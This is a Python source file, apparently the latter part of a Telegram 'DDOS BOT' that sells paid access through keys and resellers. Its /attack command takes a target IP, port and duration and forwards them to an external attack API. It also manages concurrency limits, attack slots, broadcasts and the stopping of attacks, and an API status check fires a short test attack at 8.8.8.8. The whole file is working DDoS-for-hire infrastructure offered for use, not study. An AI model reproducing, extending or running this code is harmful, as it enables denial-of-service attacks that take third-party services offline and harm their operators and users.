        bot.reply_to(msg, bold_msg("⚠️ Usage: /second 10-600\n📌 Example: /second 180\n📌 Example: /second 300"))
        return
    
    try:
        new_max = int(args[1])
        if new_max < 10 or new_max > 600:
            bot.reply_to(msg, bold_msg("❌ Value must be between 10 and 600 seconds!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid number!"))
        return
    
    global MAX_ATTACK_TIME
    MAX_ATTACK_TIME = new_max
    settings["max_attack_time"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, bold_msg(f"✅ MAX ATTACK TIME UPDATED!\n\n⏱️ New Max Attack Time: {MAX_ATTACK_TIME}s"))

@bot.message_handler(commands=['redeem'], func=lambda msg: msg.chat.type == "private")
def redeem_private(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /redeem KEY"))
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, bold_msg("❌ Invalid key!"))
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, bold_msg("❌ Key already used by someone else!"))
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, bold_msg("❌ Key expired!"))
        del keys_data[key]
        save_keys(keys_data)
        return
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = user_id
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
    
    bot.reply_to(msg, bold_msg(f"✅ ACCESS GRANTED!\n\n👤 User: {user_id}\n⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n📅 Expires: {expiry_str}"))

@bot.message_handler(commands=['genkey'], func=lambda msg: msg.chat.type == "private")
def genkey(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID and user_id not in resellers:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /genkey 1d or /genkey 5h"))
        return
    
    duration_str = args[1]
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, bold_msg("❌ Invalid duration! Use 1d or 5h"))
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    keys_data[key] = {
        "duration_value": value, 
        "duration_unit": unit, 
        "generated_by": user_id, 
        "generated_at": time.time(), 
        "expires_at": expires_at.timestamp(), 
        "used": False
    }
    save_keys(keys_data)
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    
    # KEY IN CODE BLOCK FOR EASY COPY - FAST REPLY
    bot.reply_to(msg, f"<b>🔑 KEY GENERATED:</b>\n\n<code>{key}</code>\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')

@bot.message_handler(commands=['bulk'], func=lambda msg: msg.chat.type == "private")
def bulk(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID and user_id not in resellers:
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /bulk 1d 10 or /bulk 5h 5"))
        return
    
    duration_str = args[1]
    try:
        count = int(args[2])
        if count < 1 or count > 100:
            bot.reply_to(msg, bold_msg("❌ Number of keys must be between 1 and 100!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid number!"))
        return
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, bold_msg("❌ Invalid duration! Use 1d or 5h"))
        return
    
    keys = []
    for _ in range(count):
        key = generate_key()
        expires_at = get_expiry_date(value, unit)
        keys_data[key] = {
            "duration_value": value, 
            "duration_unit": unit, 
            "generated_by": user_id, 
            "generated_at": time.time(), 
            "expires_at": expires_at.timestamp(), 
            "used": False
        }
        keys.append(key)
    save_keys(keys_data)
    
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
    bot.reply_to(msg, f"<b>🔑 KEYS GENERATED:</b>\n\n{keys_text}\n\n<b>⏰ Duration:</b> {format_duration(value, unit)}\n<b>📅 Expires:</b> {expiry_str}", parse_mode='HTML')

@bot.message_handler(commands=['removekey'], func=lambda msg: msg.chat.type == "private")
def remove_key(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /removekey KEY"))
        return
    
    key = args[1]
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        bot.reply_to(msg, bold_msg(f"✅ KEY REMOVED!\n🔑 Key: {key}"))
    else:
        bot.reply_to(msg, bold_msg("❌ Key not found!"))

@bot.message_handler(commands=['mykeys'], func=lambda msg: msg.chat.type == "private")
def mykeys(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id not in ADMIN_ID and user_id not in resellers:
        return
    
    my_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == user_id and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
            my_keys.append(f"🔑 {key}\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
    
    if my_keys:
        bot.reply_to(msg, bold_msg("📋 YOUR KEYS:\n\n" + "\n\n".join(my_keys)))
    else:
        bot.reply_to(msg, bold_msg("📋 No keys generated yet!"))

@bot.message_handler(commands=['addreseller'], func=lambda msg: msg.chat.type == "private")
def add_reseller(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /addreseller USER_ID"))
        return
    
    new_reseller = args[1]
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, bold_msg("❌ Cannot add owner!"))
        return
    if new_reseller in resellers:
        bot.reply_to(msg, bold_msg(f"❌ User {new_reseller} is already a reseller!"))
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, bold_msg(f"✅ RESELLER ADDED!\n👤 Reseller: {new_reseller}"))

@bot.message_handler(commands=['removereseller'], func=lambda msg: msg.chat.type == "private")
def remove_reseller(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /removereseller USER_ID"))
        return
    
    target = args[1]
    if target not in resellers:
        bot.reply_to(msg, bold_msg(f"❌ User {target} is not a reseller!"))
        return
    
    resellers.remove(target)
    users_data["resellers"] = resellers
    save_users(users_data)
    bot.reply_to(msg, bold_msg(f"✅ RESELLER REMOVED!\n👤 User: {target}"))

@bot.message_handler(commands=['setmax'], func=lambda msg: msg.chat.type == "private")
def set_max_concurrent(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 5"))
        return
    
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, bold_msg("❌ Value must be between 1 and 100!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid number!"))
        return
    
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    
    bot.reply_to(msg, bold_msg(f"✅ GLOBAL CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}"))

@bot.message_handler(commands=['setcooldown'], func=lambda msg: msg.chat.type == "private")
def set_cooldown(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60"))
        return
    
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, bold_msg("❌ Value must be between 1 and 300 seconds!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid number!"))
        return
    
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    
    bot.reply_to(msg, bold_msg(f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s"))

@bot.message_handler(commands=['broadcast'], func=lambda msg: msg.chat.type == "private")
def broadcast(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    def send_broadcast():
        if msg.reply_to_message:
            success_count = 0
            fail_count = 0
            caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
            
            all_users = set()
            for key, info in keys_data.items():
                if info.get("used_by"):
                    all_users.add(info.get("used_by"))
            
            for user in all_users:
                try:
                    if msg.reply_to_message.photo:
                        bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
                    elif msg.reply_to_message.video:
                        bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                    else:
                        bot.send_message(user, caption)
                    success_count += 1
                except:
                    fail_count += 1
            
            bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
        else:
            args = msg.text.split(maxsplit=1)
            if len(args) != 2:
                bot.reply_to(msg, bold_msg("⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption"))
                return
            
            message = args[1]
            
            all_users = set()
            for key, info in keys_data.items():
                if info.get("used_by"):
                    all_users.add(info.get("used_by"))
            
            success_count = 0
            fail_count = 0
            
            for user in all_users:
                try:
                    bot.send_message(user, bold_msg(f"📢 BROADCAST 📢\n\n{message}"))
                    success_count += 1
                except:
                    fail_count += 1
            
            bot.reply_to(msg, bold_msg(f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users"))
    
    executor.submit(send_broadcast)

@bot.message_handler(commands=['stopattack'], func=lambda msg: msg.chat.type == "private")
def stop_attack(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /stopattack IP:PORT"))
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, bold_msg(f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}"))
            try:
                bot.send_message(info['user'], bold_msg(f"⚠️ Your attack on {target} was stopped!"))
            except:
                pass
            break
    
    if not stopped:
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if info["target_key"] == target:
                    del bot_info["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
                    stopped = True
                    bot.reply_to(msg, bold_msg(f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}\n🤖 Bot: {bot_info.get('owner_name', 'HOSTED')}"))
                    try:
                        bot.send_message(info['user'], bold_msg(f"⚠️ Your attack on {target} was stopped!"))
                    except:
                        pass
                    break
            if stopped:
                break
    
    if not stopped:
        bot.reply_to(msg, bold_msg(f"❌ No active attack found on {target}"))

@bot.message_handler(commands=['allusers'], func=lambda msg: msg.chat.type == "private")
def all_users(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    active_users = set()
    for key, info in keys_data.items():
        if info.get("used", False) and info.get("used_by"):
            active_users.add(info.get("used_by"))
    
    user_list = []
    for u in active_users:
        user_list.append(f"👤 {u}")
    
    if user_list:
        bot.reply_to(msg, bold_msg(f"📋 ACTIVE USERS:\n\n" + "\n".join(user_list) + f"\n\nTotal: {len(active_users)}"))
    else:
        bot.reply_to(msg, bold_msg("📋 No active users yet!"))

@bot.message_handler(commands=['api_status'], func=lambda msg: msg.chat.type == "private")
def api_status(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=1&concurrent=1", timeout=5)
        api_status_text = "🟢 ONLINE" if test_response.status_code == 200 else f"🔴 ERROR {test_response.status_code}"
        content = bold_msg(f"📡 Status: {api_status_text}\n🎯 Active Attacks: {get_total_active_count()}\n📅 {format_ist_time(get_current_ist())}")
        bot.reply_to(msg, content)
    except:
        bot.reply_to(msg, bold_msg("❌ API OFFLINE"))

@bot.message_handler(commands=['maintenance'], func=lambda msg: msg.chat.type == "private")
def maintenance(msg):
    user_id = str(msg.from_user.id)
    
    if user_id not in ADMIN_ID:
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, bold_msg("⚠️ Usage: /maintenance on or /maintenance off"))
        return
    
    global maintenance_mode
    status = args[1].lower()
    
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, bold_msg("🔧 MAINTENANCE MODE ENABLED"))
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, bold_msg("✅ MAINTENANCE MODE DISABLED"))
    else:
        bot.reply_to(msg, bold_msg("❌ Invalid status! Use on or off"))

@bot.message_handler(commands=['help'], func=lambda msg: msg.chat.type == "private")
def help_private(msg):
    user_id = str(msg.from_user.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if user_id in ADMIN_ID:
        content = bold_msg(f"""👑 OWNER HELP

🔑 KEYS:
/genkey 1d - Generate 1 key
/bulk 1d 10 - Generate bulk keys
/removekey KEY - Remove key
/mykeys - View your keys

🤖 HOST BOT:
/host TOKEN ID CONCURRENT NAME
/unhost TOKEN
/allhosts

⚙️ SETTINGS:
/setmax 1-100 - Set concurrent limit
/setcooldown 1-300 - Set cooldown
/second 10-600 - Set max attack time

👤 RESELLERS:
/addreseller ID - Add reseller
/removereseller ID - Remove reseller

🔧 OTHER:
/maintenance on/off
/broadcast
/stopattack IP:PORT
/allusers
/api_status

📅 {current_time}""")
        bot.reply_to(msg, content)
    
    elif user_id in resellers:
        content = bold_msg(f"""💎 RESELLER HELP

🔑 KEYS:
/genkey 1d - Generate 1 key
/bulk 1d 10 - Generate bulk keys
/mykeys - View your keys

📅 {current_time}""")
        bot.reply_to(msg, content)
    
    else:
        has_access = check_user_expiry(user_id)
        if has_access:
            content = bold_msg(f"""🔥 USER HELP

📝 COMMANDS:
/redeem KEY - Activate your key
/start - Check your access status

🔸 TO ATTACK:
Add this bot to any group and use /attack command

⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}""")
            bot.reply_to(msg, content)
        else:
            content = bold_msg(f"""🔥 USER HELP

📝 TO GET ACCESS:
/redeem KEY - Activate your key

🔸 AFTER REDEEM:
Add this bot to any group and use /attack command

⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}""")
            bot.reply_to(msg, content)

# ========== GROUP CHAT COMMANDS ==========
@bot.message_handler(commands=['start'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def start_group(msg):
    user_id = str(msg.from_user.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    has_access = check_user_expiry(user_id)
    
    if has_access:
        content = bold_msg(f"""✅ GROUP ATTACK BOT

👤 Your ID: {user_id}
⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}

📝 COMMANDS:
/attack IP PORT TIME
/status
/cooldown
/help""")
        bot.reply_to(msg, content)
    else:
        content = bold_msg(f"""🔑 NO ACCESS

You don't have active access!

📝 To get access:
1. Get a key from owner/reseller
2. Use /redeem KEY in PRIVATE chat with bot

⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}""")
        bot.reply_to(msg, content)

@bot.message_handler(commands=['attack'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def attack_group(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if not check_user_expiry(user_id):
        bot.reply_to(msg, bold_msg(f"🔑 ACCESS DENIED!\n\nYou don't have active access!\n\nUse /redeem KEY in PRIVATE chat with bot\n\n⚡ Max Attack Time: {MAX_ATTACK_TIME}s"))
        return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, bold_msg(f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time: {MAX_ATTACK_TIME}s"))
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    if not validate_ip(ip):
        bot.reply_to(msg, bold_msg("❌ Invalid IP address!"))
        return
    
    try:
        port = int(port)
        if port in BLOCKED_PORTS:
            blocked_ports_str = ", ".join(map(str, BLOCKED_PORTS))
            bot.reply_to(msg, bold_msg(f"🚫 Blocked Port: {port}\n❌ Please enter correct port.\n\n📋 Allowed Ports: All except {blocked_ports_str}"))
            return
        if port < 1 or port > 65535:
            bot.reply_to(msg, bold_msg("❌ Port must be between 1 and 65535!"))
            return
        duration = int(duration)
        if duration < 10 or duration > MAX_ATTACK_TIME:
            bot.reply_to(msg, bold_msg(f"❌ Duration must be 10-{MAX_ATTACK_TIME} seconds!"))
            return
    except:
        bot.reply_to(msg, bold_msg("❌ Invalid port or time!"))
        return
    
    total_active = get_total_active_count()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, bold_msg(f"❌ GLOBAL LIMIT REACHED!\n🌐 Active: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish."))
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, bold_msg(f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s"))
        return
    
    attack_id = f"{user_id}_{int(time.time())}_{random.randint(1000, 9999)}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": user_id,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = get_total_active_count()
    finish_time_str = format_ist_time(get_current_ist() + timedelta(seconds=duration))
    
    content = bold_msg(f"🔥 ATTACK LAUNCHED 🔥\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Finish: {finish_time_str}\n🌐 Active: {new_total}/{MAX_CONCURRENT}")
    bot.reply_to(msg, content)
    
    def run():
        send_attack_to_api(ip, port, duration, msg.chat.id, bot)
        time.sleep(duration)
        if attack_id in active_attacks:
            try:
                finish_msg = bold_msg(f"✅ ATTACK FINISHED ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s completed!\n💡 You can start new attack now.")
                bot.send_message(user_id, finish_msg)
            except:
                pass
            del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def status_group(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if not check_user_expiry(user_id):
        bot.reply_to(msg, bold_msg("🔑 ACCESS DENIED!\n\nYou don't have active access!\nUse /redeem KEY in PRIVATE chat with bot"))
        return
    
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
    
    status_msg = f"📊 ATTACK STATUS\n📅 {format_ist_time(get_current_ist())}\n\n"
    
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            status_msg += slots[i] + "\n\n"
        else:
            status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
    
    status_msg += f"📊 ACTIVE: {len(slots)}/{MAX_CONCURRENT}\n"
    status_msg += f"⏱️ Max Attack Time: {MAX_ATTACK_TIME}s"
    
    bot.reply_to(msg, bold_msg(status_msg))

@bot.message_handler(commands=['cooldown'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def cooldown_group(msg):
    user_id = str(msg.from_user.id)
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    if not check_user_expiry(user_id):
        bot.reply_to(msg, bold_msg("🔑 ACCESS DENIED!\n\nYou don't have active access!\nUse /redeem KEY in PRIVATE chat with bot"))
        return
    
    bot.reply_to(msg, bold_msg("✅ No cooldown! You can attack anytime."))

@bot.message_handler(commands=['help'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def help_group(msg):
    user_id = str(msg.from_user.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, bold_msg("🔧 Bot is under maintenance!"))
        return
    
    has_access = check_user_expiry(user_id)
    
    if has_access:
        content = bold_msg(f"""📝 GROUP HELP

/attack IP PORT TIME - Launch attack (Max {MAX_ATTACK_TIME}s)
/status - Check attack slots
/cooldown - Check cooldown
/help - This menu

📅 {current_time}""")
        bot.reply_to(msg, content)
    else:
        content = bold_msg(f"""📝 GROUP HELP

You need access to attack in this group!

Use /redeem KEY in PRIVATE chat with bot to get access

⚡ Max Attack Time: {MAX_ATTACK_TIME}s
📅 {current_time}""")
        bot.reply_to(msg, content)

@bot.message_handler(commands=['redeem'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def redeem_not_allowed(msg):
    bot.reply_to(msg, bold_msg("❌ /redeem command only works in PRIVATE chat with bot!\n\nPlease use /redeem KEY in private message."))

@bot.message_handler(func=lambda msg: True)
def ignore_all(msg):
    pass

# ========== START BOT ==========
print("=" * 50)
print("✨ DDOS BOT STARTED ✨")
print(f"👑 Owners: 8487946379, 7495474613")
print(f"💎 Resellers: {len(resellers)}")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"⏱️ Max Attack Time: {MAX_ATTACK_TIME}s")
print(f"🚫 Blocked Ports: {BLOCKED_PORTS}")
print(f"🤖 Hosted Bots: {len(hosted_bots)}")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")
print("=" * 50)

while True:
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as e:
        print(f"Bot polling error: {e}")
        time.sleep(5)
